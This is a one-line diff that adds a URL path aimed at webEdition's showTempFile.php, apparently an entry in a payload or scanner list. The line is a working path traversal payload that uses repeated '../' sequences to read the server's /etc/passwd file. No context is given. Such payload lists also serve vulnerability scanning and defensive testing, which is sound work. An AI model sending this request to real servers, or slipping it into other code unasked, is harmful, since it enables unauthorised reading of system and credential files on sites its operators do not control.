@@ -1,0 +1,1 @@
+/webEdition/showTempFile.php?file=../../../../etc/passwd
